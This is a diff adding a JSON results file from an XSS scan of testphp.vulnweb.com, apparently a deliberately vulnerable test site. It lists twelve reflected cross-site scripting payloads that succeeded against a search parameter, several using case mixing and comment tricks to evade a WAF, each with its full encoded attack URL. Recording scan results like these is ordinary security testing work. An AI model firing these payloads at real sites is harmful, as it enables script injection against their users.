@@ -1,0 +1,132 @@
+{
+  "metadata": {
+    "scan_date": "2025-06-16T21:53:42.749540",
+    "target_url": "http://testphp.vulnweb.com/search.php?test=",
+    "method": "GET",
+    "waf_type": "Generic WAF (Block Message Detection)",
+    "payloads_tested": 84,
+    "vulnerabilities_found": 12
+  },
+  "vulnerabilities": [
+    {
+      "url": "http://testphp.vulnweb.com/search.php?test=%27%3E%3Cimg%20src%3D/%2Ax%2A/x%20onerror%3D/%2Ax%2A/alert%281%29%3E",
+      "payload": "'><img src=/*x*/x onerror=/*x*/alert(1)>",
+      "complete_url": "http://testphp.vulnweb.com/search.php?test=%27%3E%3Cimg%20src%3D/%2Ax%2A/x%20onerror%3D/%2Ax%2A/alert%281%29%3E",
+      "type": "DOM Injection",
+      "method": "GET",
+      "context": "IMG element with onerror",
+      "message": null,
+      "waf": "Generic WAF (Block Message Detection)"
+    },
+    {
+      "url": "http://testphp.vulnweb.com/search.php?test=%3Cscript%3E%27%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E%3C/script%3E",
+      "payload": "<script>'><img src=x onerror=alert(1)></script>",
+      "complete_url": "http://testphp.vulnweb.com/search.php?test=%3Cscript%3E%27%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E%3C/script%3E",
+      "type": "DOM Injection",
+      "method": "GET",
+      "context": "IMG element with onerror",
+      "message": null,
+      "waf": "Generic WAF (Block Message Detection)"
+    },
+    {
+      "url": "http://testphp.vulnweb.com/search.php?test=%27%3E%3CIMG%20sRC%3DX%20oNERRor%3Dalert%281%29%3E",
+      "payload": "'><IMG sRC=X oNERRor=alert(1)>",
+      "complete_url": "http://testphp.vulnweb.com/search.php?test=%27%3E%3CIMG%20sRC%3DX%20oNERRor%3Dalert%281%29%3E",
+      "type": "DOM Injection",
+      "method": "GET",
+      "context": "IMG element with onerror",
+      "message": null,
+      "waf": "Generic WAF (Block Message Detection)"
+    },
+    {
+      "url": "http://testphp.vulnweb.com/search.php?test=%3C/script%3E%3Csvg/onload%3D%27%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E%3E",
+      "payload": "</script><svg/onload='><img src=x onerror=alert(1)>>",
+      "complete_url": "http://testphp.vulnweb.com/search.php?test=%3C/script%3E%3Csvg/onload%3D%27%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E%3E",
+      "type": "DOM Injection",
+      "method": "GET",
+      "context": "IMG element with onerror",
+      "message": null,
+      "waf": "Generic WAF (Block Message Detection)"
+    },
+    {
+      "url": "http://testphp.vulnweb.com/search.php?test=%22%20autofocus%20onfocus%3D%27%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E%20x%3D%22",
+      "payload": "\" autofocus onfocus='><img src=x onerror=alert(1)> x=\"",
+      "complete_url": "http://testphp.vulnweb.com/search.php?test=%22%20autofocus%20onfocus%3D%27%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E%20x%3D%22",
+      "type": "DOM Injection",
+      "method": "GET",
+      "context": "IMG element with onerror",
+      "message": null,
+      "waf": "Generic WAF (Block Message Detection)"
+    },
+    {
+      "url": "http://testphp.vulnweb.com/search.php?test=%7B%7D%29%28%27%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E%29//",
+      "payload": "{})('><img src=x onerror=alert(1)>)//",
+      "complete_url": "http://testphp.vulnweb.com/search.php?test=%7B%7D%29%28%27%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E%29//",
+      "type": "DOM Injection",
+      "method": "GET",
+      "context": "IMG element with onerror",
+      "message": null,
+      "waf": "Generic WAF (Block Message Detection)"
+    },
+    {
+      "url": "http://testphp.vulnweb.com/search.php?test=%60%24%27%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E%60",
+      "payload": "`$'><img src=x onerror=alert(1)>`",
+      "complete_url": "http://testphp.vulnweb.com/search.php?test=%60%24%27%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E%60",
+      "type": "DOM Injection",
+      "method": "GET",
+      "context": "IMG element with onerror",
+      "message": null,
+      "waf": "Generic WAF (Block Message Detection)"
+    },
+    {
+      "url": "http://testphp.vulnweb.com/search.php?test=%27%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E",
+      "payload": "'><img src=x onerror=alert(1)>",
+      "complete_url": "http://testphp.vulnweb.com/search.php?test=%27%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E",
+      "type": "DOM Injection",
+      "method": "GET",
+      "context": "IMG element with onerror",
+      "message": null,
+      "waf": "Generic WAF (Block Message Detection)"
+    },
+    {
+      "url": "http://testphp.vulnweb.com/search.php?test=javascript%3A%27%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E",
+      "payload": "javascript:'><img src=x onerror=alert(1)>",
+      "complete_url": "http://testphp.vulnweb.com/search.php?test=javascript%3A%27%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E",
+      "type": "DOM Injection",
+      "method": "GET",
+      "context": "IMG element with onerror",
+      "message": null,
+      "waf": "Generic WAF (Block Message Detection)"
+    },
+    {
+      "url": "http://testphp.vulnweb.com/search.php?test=%27%3E%3CIMg%20Src%3DX%20OnERrOR%3DAlerT%281%29%3E",
+      "payload": "'><IMg Src=X OnERrOR=AlerT(1)>",
+      "complete_url": "http://testphp.vulnweb.com/search.php?test=%27%3E%3CIMg%20Src%3DX%20OnERrOR%3DAlerT%281%29%3E",
+      "type": "DOM Injection",
+      "method": "GET",
+      "context": "IMG element with onerror",
+      "message": null,
+      "waf": "Generic WAF (Block Message Detection)"
+    },
+    {
+      "url": "http://testphp.vulnweb.com/search.php?test=%22%3E%3Csvg/onload%3D%27%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E%3E",
+      "payload": "\"><svg/onload='><img src=x onerror=alert(1)>>",
+      "complete_url": "http://testphp.vulnweb.com/search.php?test=%22%3E%3Csvg/onload%3D%27%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E%3E",
+      "type": "DOM Injection",
+      "method": "GET",
+      "context": "IMG element with onerror",
+      "message": null,
+      "waf": "Generic WAF (Block Message Detection)"
+    },
+    {
+      "url": "http://testphp.vulnweb.com/search.php?test=%24%7B%27%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E%7D",
+      "payload": "${'><img src=x onerror=alert(1)>}",
+      "complete_url": "http://testphp.vulnweb.com/search.php?test=%24%7B%27%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E%7D",
+      "type": "DOM Injection",
+      "method": "GET",
+      "context": "IMG element with onerror",
+      "message": null,
+      "waf": "Generic WAF (Block Message Detection)"
+    }
+  ]
+}
